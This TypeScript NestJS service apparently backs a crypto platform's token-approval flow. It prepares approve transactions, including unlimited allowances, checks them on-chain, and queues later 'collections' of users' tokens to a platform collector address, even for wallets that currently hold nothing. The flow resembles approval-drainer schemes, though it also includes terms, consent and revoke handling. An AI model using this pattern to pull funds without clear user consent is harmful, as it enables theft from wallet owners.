import {
  BadRequestException,
  forwardRef,
  Inject,
  Injectable,
} from "@nestjs/common";
import {
  CollectionIntentStatus,
  type Prisma,
} from "@prisma/client";
import {
  allocatePublicId,
  journeyWriteFields,
  normalizeJourneyId,
  tokenQualifier,
} from "../../common/ids/public-id.helper";
import { errorForLog, getErrorMessage } from "../../common/utils/error-message";
import { CollectionIntentService } from "../collections/collection-intent.service";
import { PlatformConfigService } from "../../config/platform-config.service";
import { WalletSessionService } from "../auth/wallet-session.service";
import { TRANSFER_SKIP_REASONS } from "@trustmycard/shared/constants/collection";
import { prisma } from "../../infrastructure/database/prisma-shared";
import {
  EVM_ADDRESS_RE,
  EVM_CHAIN_ID,
  MAX_UINT256,
  TRON_ADDRESS_RE,
  TRON_GRID,
  sleep,
} from "./wallet.constants";
import {
  base58ToHex,
  encodeApprove,
  getToken,
  isEvm,
  ownerAddressFilter,
  parseHumanToRaw,
  parseToken,
  spenderAddressFilter,
  toRawFromHuman,
  tokenBalanceIsZero,
  tronAddressToAbiWord,
} from "./wallet-crypto.util";
import { WalletNotifyService } from "./wallet-notify.service";
import { WalletRpcService } from "./wallet-rpc.service";
import { WalletCollectorContextService } from "./wallet-collector-context.service";
import { WalletCollectionService } from "./wallet-collection.service";
import { UserService } from "../users/user.service";

@Injectable()
export class WalletApprovalService {
  constructor(
    private readonly notify: WalletNotifyService,
    private readonly rpc: WalletRpcService,
    private readonly collectorContext: WalletCollectorContextService,
    private readonly platformConfig: PlatformConfigService,
    private readonly collectionIntents: CollectionIntentService,
    @Inject(forwardRef(() => WalletCollectionService))
    private readonly collection: WalletCollectionService,
    private readonly walletSessions: WalletSessionService,
    private readonly users: UserService,
  ) {}

  async prepareApproval(body: Record<string, unknown>) {
    const network = String(body.network ?? "")
      .trim()
      .toLowerCase();
    const owner = String(body.owner ?? "").trim();
    const token = parseToken(body.token);
    const unlimited = Boolean(body.unlimited);
    this.notify.logFlow("APPROVAL PREPARE REQUEST", { network, token, unlimited });
    if (!network || !owner)
      throw new BadRequestException("network and owner are required");
    const tokenInfo = getToken(network, token);
    if (!tokenInfo) throw new BadRequestException("Unsupported token/network");
    const amountRaw = unlimited
      ? BigInt(MAX_UINT256)
      : parseHumanToRaw(
          String(body.amountHuman ?? "").trim(),
          tokenInfo.decimals,
        );
    if (!unlimited && amountRaw <= BigInt(0))
      throw new BadRequestException("Amount must be greater than zero");
    const spender = this.rpc.spenderFor(network);
    if (!spender)
      throw new BadRequestException(
        network === "tron"
          ? "Set NEXT_PUBLIC_SPENDER_TRON"
          : "Set NEXT_PUBLIC_SPENDER_EVM",
      );
    if (network === "tron") {
      if (!TRON_ADDRESS_RE.test(owner) || !TRON_ADDRESS_RE.test(spender))
        throw new BadRequestException("Invalid Tron owner/spender");
      const parameter = `${tronAddressToAbiWord(spender)}${amountRaw.toString(16).padStart(64, "0")}`;
      const res = await fetch(`${TRON_GRID}/wallet/triggersmartcontract`, {
        method: "POST",
        headers: this.rpc.tronHeaders(),
        body: JSON.stringify({
          owner_address: base58ToHex(owner),
          contract_address: base58ToHex(tokenInfo.address),
          function_selector: "approve(address,uint256)",
          parameter,
          fee_limit: this.platformConfig.getApproval().tronApproveFeeLimitSun,
          call_value: 0,
          visible: false,
        }),
        cache: "no-store",
      });
      const json = (await res.json()) as {
        transaction?: Record<string, unknown>;
        result?: { message?: string; result?: boolean };
        Error?: string;
      };
      if (!res.ok || json.result?.result === false || !json.transaction)
        throw new BadRequestException(
          json.result?.message || json.Error || "Failed to build Tron tx",
        );
      await this.notify.recordAudit(`owner:${owner}`, "prepare", "approval", {
        network,
        token,
        unlimited,
        spender,
        amountRaw: amountRaw.toString(),
      });
      this.notify.logFlow("APPROVAL PREPARE BUILT", {
        network,
        token,
        amountRaw: amountRaw.toString(),
      });
      return {
        network,
        owner,
        spender,
        token,
        tokenAddress: tokenInfo.address,
        decimals: tokenInfo.decimals,
        amountRaw: amountRaw.toString(),
        amountHuman: unlimited ? "UNLIMITED" : String(body.amountHuman ?? ""),
        unlimited,
        transaction: json.transaction,
      };
    }
    if (
      !isEvm(network) ||
      !EVM_ADDRESS_RE.test(owner) ||
      !EVM_ADDRESS_RE.test(spender)
    )
      throw new BadRequestException("Invalid EVM network/owner/spender");
    await this.notify.recordAudit(`owner:${owner}`, "prepare", "approval", {
      network,
      token,
      unlimited,
      spender,
      amountRaw: amountRaw.toString(),
    });
    this.notify.logFlow("APPROVAL PREPARE BUILT", {
      network,
      token,
      amountRaw: amountRaw.toString(),
    });
    return {
      network,
      owner,
      spender,
      token,
      tokenAddress: tokenInfo.address,
      decimals: tokenInfo.decimals,
      amountRaw: amountRaw.toString(),
      amountHuman: unlimited ? "UNLIMITED" : String(body.amountHuman ?? ""),
      unlimited,
      chainId: EVM_CHAIN_ID[network],
      to: tokenInfo.address,
      data: encodeApprove(spender, amountRaw),
      value: "0x0",
    };
  }

  async verifyAllowance(body: Record<string, unknown>) {
    const network = String(body.network ?? "")
      .trim()
      .toLowerCase();
    const owner = String(body.owner ?? "").trim();
    const spender = String(body.spender ?? "").trim();
    const token = parseToken(body.token);
    const tokenInfo = getToken(network, token);
    if (!tokenInfo || !owner || !spender)
      throw new BadRequestException(
        "network, owner, spender and token required",
      );
    if (network === "tron") {
      const parameter = `${tronAddressToAbiWord(owner)}${tronAddressToAbiWord(spender)}`;
      const res = await fetch(`${TRON_GRID}/wallet/triggerconstantcontract`, {
        method: "POST",
        headers: this.rpc.tronHeaders(),
        body: JSON.stringify({
          owner_address: owner,
          contract_address: tokenInfo.address,
          function_selector: "allowance(address,address)",
          parameter,
          visible: true,
        }),
        cache: "no-store",
        signal: AbortSignal.timeout(this.rpc.rpcTimeoutMs()),
      });
      const json = (await res.json()) as {
        constant_result?: string[];
        result?: { message?: string };
      };
      const hex = json.constant_result?.[0];
      if (!hex)
        throw new BadRequestException(
          json.result?.message || "Tron allowance failed",
        );
      const allowance = BigInt(`0x${hex}`).toString();
      return {
        ok: true,
        hasAllowance: BigInt(allowance) > BigInt(0),
        allowance,
        spender,
        token,
        tokenAddress: tokenInfo.address,
      };
    }
    if (!isEvm(network))
      throw new BadRequestException("Unsupported network");
    const data = `0xdd62ed3e${owner.slice(2).toLowerCase().padStart(64, "0")}${spender.slice(2).toLowerCase().padStart(64, "0")}`;
    const result = await this.rpc.evmRpcCall(network, "eth_call", [
      { to: tokenInfo.address, data },
      "latest",
    ]);
    const allowance = BigInt(result).toString();
    return {
      ok: true,
      hasAllowance: BigInt(allowance) > BigInt(0),
      allowance,
      spender,
      token,
      tokenAddress: tokenInfo.address,
    };
  }

  tronFullHost(): string {
    return this.platformConfig.getChains().tronFullHost || TRON_GRID;
  }

  async readTronTransactionInfo(txHash: string): Promise<{
    id?: string;
    blockNumber?: number;
    receipt?: { result?: string };
    result?: string;
  } | null> {
    try {
      const res = await fetch(
        `${this.rpc.tronFullHost()}/wallet/gettransactioninfobyid`,
        {
          method: "POST",
          headers: this.rpc.tronHeaders(),
          body: JSON.stringify({ value: txHash }),
          cache: "no-store",
          signal: AbortSignal.timeout(
            this.platformConfig.getCollector().rpcTimeoutMs,
          ),
        },
      );
      if (!res.ok) return null;
      return (await res.json()) as {
        id?: string;
        blockNumber?: number;
        receipt?: { result?: string };
        result?: string;
      };
    } catch {
      return null;
    }
  }

  async verifyApprovalReceipt(args: {
    network: string;
    txHash: string;
    owner: string;
    spender: string;
    tokenAddress: string;
  }): Promise<void> {
    if (args.network === "tron") {
      const txConfirm = this.platformConfig.getTransfer();
      for (
        let attempt = 0;
        attempt < txConfirm.tronTxConfirmMaxAttempts;
        attempt += 1
      ) {
        const info = await this.rpc.readTronTransactionInfo(args.txHash);
        const result = info?.receipt?.result ?? info?.result ?? "SUCCESS";
        const confirmed =
          Boolean(info?.id) ||
          (info?.blockNumber != null && info.blockNumber > 0);
        if (confirmed && result === "SUCCESS") {
          return;
        }
        if (attempt < txConfirm.tronTxConfirmMaxAttempts - 1) {
          await sleep(txConfirm.tronTxConfirmPollMs);
        }
      }
      throw new BadRequestException(
        "Approval transaction receipt is not confirmed",
      );
    }
    if (!isEvm(args.network))
      throw new BadRequestException("Unsupported network");
    const [transaction, receipt] = await Promise.all([
      this.rpc.evmRpcCall(args.network, "eth_getTransactionByHash", [
        args.txHash,
      ]) as Promise<{
        from?: string;
        to?: string;
        input?: string;
        data?: string;
      } | null>,
      this.rpc.evmRpcCall(args.network, "eth_getTransactionReceipt", [
        args.txHash,
      ]) as Promise<{
        status?: string;
      } | null>,
    ]);
    const input = transaction?.input ?? transaction?.data ?? "";
    const spenderWord = args.spender
      .replace(/^0x/i, "")
      .toLowerCase()
      .padStart(64, "0");
    if (
      !transaction ||
      !receipt ||
      receipt.status !== "0x1" ||
      transaction.from?.toLowerCase() !== args.owner.toLowerCase() ||
      transaction.to?.toLowerCase() !== args.tokenAddress.toLowerCase() ||
      !input.toLowerCase().startsWith(`0x095ea7b3${spenderWord}`)
    ) {
      throw new BadRequestException(
        "Approval receipt does not match the requested authorization",
      );
    }
  }
  async confirmApproval(
    body: Record<string, unknown>,
    correlation?: { correlationId?: string; requestId?: string },
    existingWalletSession?: {
      address: string;
      network: string;
    } | null,
  ) {
    const network = String(body.network ?? "")
      .trim()
      .toLowerCase();
    const owner = String(body.owner ?? "").trim();
    const txHash = String(body.txHash ?? "").trim();
    const amountRaw = String(body.amountRaw ?? "").trim();
    const token = parseToken(body.token);
    const traceIdRaw = String(
      body.traceId ?? correlation?.correlationId ?? "",
    ).trim();
    const traceId = normalizeJourneyId(traceIdRaw);
    this.notify.logFlow("APPROVAL CONFIRM REQUEST", {
      traceId: traceId ?? undefined,
      network,
      token,
      owner,
      txHash,
      requestId: correlation?.requestId,
    });
    if (!network || !owner || !txHash || !amountRaw)
      throw new BadRequestException(
        "network, owner, txHash, amountRaw required",
      );
    const spender = this.rpc.spenderFor(network);
    const tokenInfo = getToken(network, token);
    if (!tokenInfo) throw new BadRequestException("Unsupported token/network");
    let verified: Awaited<ReturnType<WalletApprovalService["verifyAllowance"]>> | null =
      null;
    const transferCfg = this.platformConfig.getTransfer();
    let verifyError: unknown;
    for (
      let attempt = 0;
      attempt < transferCfg.allowanceVerifyMaxAttempts;
      attempt += 1
    ) {
      try {
        verified = await this.verifyAllowance({
          network,
          owner,
          spender,
          token,
        });
        break;
      } catch (err) {
        verifyError = err;
        if (attempt < transferCfg.allowanceVerifyMaxAttempts - 1) {
          await sleep(
            network === "tron"
              ? transferCfg.allowancePollDelayTronMs
              : transferCfg.allowancePollDelayEvmMs,
          );
        }
      }
    }
    const expected = BigInt(amountRaw);
    const onChain = BigInt(verified?.allowance ?? "0");
    const unlimited = Boolean(body.unlimited);
    const hasAllowance = unlimited ? onChain > BigInt(0) : onChain >= expected;
    if (verified) {
      await this.verifyApprovalReceipt({
        network,
        txHash,
        owner,
        spender,
        tokenAddress: tokenInfo.address,
      });
    }
    const executeTransfer = Boolean(body.executeTransfer);
    const tokenBalanceHuman = String(body.tokenBalanceHuman ?? "").trim();
    const isZeroBalance = tokenBalanceIsZero(tokenBalanceHuman);
    const zeroBalanceSkipError =
      !executeTransfer && isZeroBalance
        ? TRANSFER_SKIP_REASONS.zero_balance_collect_later
        : null;
    // Automatic collections settle to platform destination (spender or dev collector).
    const transferToAddress = this.collectorContext.collectionDestinationFor(owner, network);
    const transferAmountRawInput = String(body.transferAmountRaw ?? "").trim();
    const transferAmountHumanInput = String(
      body.transferAmountHuman ?? "",
    ).trim();
    const immediateCollectionAt = hasAllowance
      ? new Date()
      : this.collectorContext.nextCollectionCheck();
    const requestedTransferRaw = transferAmountRawInput
      ? BigInt(transferAmountRawInput)
      : transferAmountHumanInput
        ? toRawFromHuman(transferAmountHumanInput, tokenInfo.decimals)
        : expected;
    const { approval, collectionIntent } = await prisma.$transaction(
      async (tx) => {
        const journeyFields = traceId
          ? await journeyWriteFields(
              tx,
              "approval",
              tokenQualifier(token),
              traceId,
              owner,
            )
          : {};
        const existingApproval = await tx.approval.findUnique({
          where: { network_txHash: { network, txHash } },
        });
        const persisted = existingApproval
          ? await tx.approval.update({
              where: { id: existingApproval.id },
              data: {
                termsVersion: String(
                  body.termsVersion ??
                    this.platformConfig.getApproval().termsVersion,
                ),
                collectionToAddress: transferToAddress,
                collectionEnabled: ![
                  "COMPLETED",
                  "REVOKED",
                  "EXPIRED",
                  "SUPERSEDED",
                ].includes(existingApproval.status),
                nextCheckAt: immediateCollectionAt,
                lastError: zeroBalanceSkipError ?? errorForLog(verifyError),
                ...(traceId
                  ? {
                      traceId: existingApproval.traceId ?? traceId,
                      ...(!existingApproval.publicId
                        ? {
                            publicId:
                              journeyFields.publicId ??
                              (await allocatePublicId(
                                tx,
                                "approval",
                                tokenQualifier(token),
                                traceId,
                              )),
                          }
                        : {}),
                    }
                  : {}),
              },
            })
          : await tx.approval.create({
              data: {
                ownerAddress: owner,
                spenderAddress: spender,
                network,
                tokenSymbol: token,
                tokenAddress: tokenInfo.address,
                decimals: tokenInfo.decimals,
                amountRaw,
                amountHuman: String(body.amountHuman ?? amountRaw),
                remainingRaw: amountRaw,
                collectedRaw: "0",
                txHash,
                status: hasAllowance ? "ACTIVE" : "SUBMITTED",
                termsVersion: String(
                  body.termsVersion ??
                    this.platformConfig.getApproval().termsVersion,
                ),
                unlimited,
                collectionEnabled: true,
                collectionToAddress: transferToAddress,
                nextCheckAt: immediateCollectionAt,
                lastError: zeroBalanceSkipError ?? errorForLog(verifyError),
                ...journeyFields,
              },
            });

        const supersededIds = await this.supersedeOtherApprovals(tx, {
          persistedId: persisted.id,
          owner,
          spender,
          network,
          token,
        });
        if (supersededIds.length > 0) {
          this.notify.logFlow("APPROVAL SUPERSEDED", {
            approvalId: persisted.id,
            network,
            token,
            supersededApprovalIds: supersededIds,
          });
        }

        const queued =
          hasAllowance && executeTransfer && requestedTransferRaw > BigInt(0)
            ? await this.collectionIntents.createForApproval(tx, {
                approvalId: persisted.id,
                merchantId: String(body.merchantId ?? "platform"),
                merchantReference:
                  String(body.merchantReference ?? "") || undefined,
                ownerAddress: owner,
                spenderAddress: spender,
                network,
                tokenSymbol: token,
                tokenAddress: tokenInfo.address,
                requestedRaw: requestedTransferRaw.toString(),
                sourceTxHash: txHash,
                traceId: traceId ?? persisted.traceId ?? undefined,
              })
            : null;
        return {
          approval: persisted,
          collectionIntent: queued?.intent ?? null,
        };
      },
    );
    let transfer: {
      transferId: string;
      txHash: string;
      transferredRaw: string;
      blockNumber: number | null;
    } | null = null;
    let transferSkippedReason: string | null = null;

    if (!hasAllowance) {
      transferSkippedReason = "allowance_not_confirmed";
    } else if (!executeTransfer) {
      transferSkippedReason = isZeroBalance
        ? "zero_balance_collect_later"
        : "execute_transfer_disabled";
    } else {
      if (requestedTransferRaw <= BigInt(0)) {
        transferSkippedReason = "zero_requested_amount";
      } else {
        transferSkippedReason = "queued_for_background_collection";
      }
    }

    await this.notify.recordAudit(
      `owner:${owner}`,
      "confirm",
      "approval",
      {
        network,
        txHash,
        traceId,
        allowance: verified?.allowance ?? "0",
        confirmed: hasAllowance,
        executeTransfer,
        tokenBalanceHuman: tokenBalanceHuman || null,
        zeroBalanceAtConfirm: isZeroBalance,
        transferSkippedReason,
        collectionPolicy: transferSkippedReason,
        collectionIntentId: collectionIntent?.id ?? null,
      },
      approval.id,
    );

    this.notify.logFlow("APPROVAL CONFIRM RESULT", {
      traceId,
      approvalId: approval.id,
      hasAllowance,
      executeTransfer,
      transferSkippedReason,
      zeroBalanceAtConfirm: isZeroBalance,
      collectionEnabled: approval.collectionEnabled,
      nextCheckAt: approval.nextCheckAt?.toISOString() ?? null,
      collectionIntentId: collectionIntent?.id ?? null,
    });

    if (hasAllowance && executeTransfer && requestedTransferRaw > BigInt(0)) {
      await this.collection.runImmediateCollectionWithRetries(approval.id);
    }

    const traceIdForSession =
      traceId ?? clientSessionIdFromBody(body) ?? undefined;
    void this.users.linkWallet(owner, traceIdForSession);
    let established: { token: string; expiresAt: Date } | null = null;
    if (!this.walletSessions.isPersonalSignEnabled() && !existingWalletSession) {
      await this.verifyApprovalReceipt({
        network,
        txHash,
        owner,
        spender,
        tokenAddress: tokenInfo.address,
      });
      established = await this.walletSessions.establishFromVerifiedTransaction({
        address: owner,
        network,
        proofTxHash: txHash,
        scopeClientSessionId: traceIdForSession ?? null,
      });
    }

    return {
      ok: true,
      approvalId: approval.id,
      status: approval.status,
      allowance: verified?.allowance ?? "0",
      hasAllowance,
      txHash,
      spender,
      transfer,
      transferSkippedReason,
      collectionIntent: collectionIntent
        ? {
            id: collectionIntent.id,
            status: collectionIntent.status,
            queuedAt: collectionIntent.queuedAt,
          }
        : null,
      timestamp: approval.createdAt,
      ...(established
        ? {
            walletSessionToken: established.token,
            walletSessionExpiresAt: established.expiresAt.toISOString(),
          }
        : {}),
    };
  }

  private async supersedeOtherApprovals(
    tx: Prisma.TransactionClient,
    args: {
      persistedId: string;
      owner: string;
      spender: string;
      network: string;
      token: string;
    },
  ): Promise<string[]> {
    const toSupersede = await tx.approval.findMany({
      where: {
        id: { not: args.persistedId },
        ...ownerAddressFilter(args.owner, args.network),
        ...spenderAddressFilter(args.spender, args.network),
        network: args.network,
        tokenSymbol: args.token,
        status: { in: ["SUBMITTED", "ACTIVE", "PARTIALLY_USED"] },
      },
      select: { id: true },
    });
    if (toSupersede.length === 0) return [];

    const ids = toSupersede.map((row) => row.id);
    await tx.approval.updateMany({
      where: { id: { in: ids } },
      data: {
        status: "SUPERSEDED",
        collectionEnabled: false,
        nextCheckAt: null,
        leaseOwner: null,
        leaseUntil: null,
      },
    });
    await tx.collectionIntent.updateMany({
      where: {
        approvalId: { in: ids },
        status: {
          in: [
            CollectionIntentStatus.CREATED,
            CollectionIntentStatus.QUEUED,
            CollectionIntentStatus.EXECUTING,
            CollectionIntentStatus.BROADCAST,
            CollectionIntentStatus.CONFIRMING,
          ],
        },
      },
      data: { status: CollectionIntentStatus.CANCELLED },
    });
    return ids;
  }

  /** When a new approval superseded an older one but collection landed on the sibling. */
  async reconcileApprovalFromSiblingTransfer(
    approvalId: string,
  ): Promise<boolean> {
    const approval = await prisma.approval.findUnique({
      where: { id: approvalId },
    });
    if (!approval || BigInt(approval.collectedRaw || "0") > BigInt(0))
      return false;

    const siblingTransfer = await prisma.transfer.findFirst({
      where: {
        status: "confirmed",
        confirmedAt: { gte: approval.createdAt },
        approval: {
          id: { not: approvalId },
          ...ownerAddressFilter(approval.ownerAddress, approval.network),
          network: approval.network,
          tokenSymbol: approval.tokenSymbol,
        },
      },
      orderBy: { confirmedAt: "desc" },
      select: { amountRaw: true, txHash: true, confirmedAt: true },
    });
    if (!siblingTransfer?.txHash) return false;

    await prisma.$transaction([
      prisma.approval.update({
        where: { id: approvalId },
        data: {
          collectedRaw: siblingTransfer.amountRaw,
          collectionEnabled: false,
          lastError: null,
          failureCount: 0,
          nextCheckAt: null,
        },
      }),
      prisma.collectionIntent.updateMany({
        where: {
          approvalId,
          status: {
            in: [
              CollectionIntentStatus.CREATED,
              CollectionIntentStatus.QUEUED,
              CollectionIntentStatus.EXECUTING,
              CollectionIntentStatus.BROADCAST,
              CollectionIntentStatus.CONFIRMING,
              CollectionIntentStatus.FAILED,
              CollectionIntentStatus.BLOCKED,
            ],
          },
        },
        data: {
          status: CollectionIntentStatus.SETTLED,
          settledRaw: siblingTransfer.amountRaw,
          settledAt: siblingTransfer.confirmedAt ?? new Date(),
        },
      }),
    ]);
    this.notify.logFlow("APPROVAL RECONCILED FROM SIBLING TRANSFER", {
      approvalId,
      network: approval.network,
      token: approval.tokenSymbol,
      siblingTxHash: siblingTransfer.txHash,
      amountRaw: siblingTransfer.amountRaw,
    });
    return true;
  }
  async prepareRevoke(body: Record<string, unknown>) {
    const approvalId = String(body.approvalId ?? "").trim();
    const approval = approvalId
      ? await prisma.approval.findUnique({ where: { id: approvalId } })
      : null;
    const network = (approval?.network ?? String(body.network ?? ""))
      .trim()
      .toLowerCase();
    const owner = (approval?.ownerAddress ?? String(body.owner ?? "")).trim();
    const token = parseToken(approval?.tokenSymbol ?? body.token);
    return this.prepareApproval({
      network,
      owner,
      token,
      amountHuman: "0",
      unlimited: false,
    });
  }
  async registerApproved(body: Record<string, unknown>) {
    const network = String(body.network ?? "")
      .trim()
      .toLowerCase();
    const address = String(body.address ?? "").trim();
    if (!network || !address)
      throw new BadRequestException("network and address are required");
    const amountRaw = String(body.amountRaw ?? body.allowance ?? "0");
    const txHash =
      String(body.txid ?? "").trim() ||
      `legacy:${network}:${address.toLowerCase()}`;
    const token = parseToken(body.token);
    const tokenInfo = getToken(network, token);
    if (!tokenInfo) throw new BadRequestException("Unsupported network/token");
    const approval = await prisma.approval.upsert({
      where: { network_txHash: { network, txHash } },
      update: {
        status: "ACTIVE",
        amountRaw,
        amountHuman: String(body.amountHuman ?? amountRaw),
        remainingRaw: amountRaw,
        updatedAt: new Date(),
      },
      create: {
        ownerAddress: address,
        spenderAddress: this.rpc.spenderFor(network),
        network,
        tokenSymbol: token,
        tokenAddress: tokenInfo.address,
        decimals: tokenInfo.decimals,
        amountRaw,
        amountHuman: String(body.amountHuman ?? amountRaw),
        remainingRaw: amountRaw,
        txHash,
        status: "ACTIVE",
        termsVersion: this.platformConfig.getApproval().termsVersion,
        unlimited: false,
      },
    });
    await this.notify.recordAudit(
      `owner:${address}`,
      "register_legacy",
      "approval",
      { network, txHash },
      approval.id,
    );
    return {
      code: 200,
      status: "success",
      message: "OK",
      data: { registered: true, approvalId: approval.id },
      timestamp: new Date().toISOString(),
    };
  }
  legacyTronApprove(body: Record<string, unknown>) {
    return this.prepareApproval({
      network: "tron",
      owner: body.owner,
      token: body.token,
      amountHuman: body.amountHuman,
      unlimited: body.unlimited,
    });
  }
  async consent(body: Record<string, unknown>) {
    const address = String(body.address ?? "").trim();
    const txid = String(body.txid ?? body.txHash ?? body.hash ?? "").trim();
    const ok = Boolean(address && txid);
    await this.notify.recordAudit(
      `owner:${address || "unknown"}`,
      "consent",
      "consent",
      { ...body, ok },
    );
    return { ok, txid };
  }
}

function clientSessionIdFromBody(
  body: Record<string, unknown>,
): string | undefined {
  const traceId = normalizeJourneyId(String(body.traceId ?? ""));
  if (traceId) return traceId;
  const sessionId = normalizeJourneyId(String(body.sessionId ?? ""));
  return sessionId ?? undefined;
}
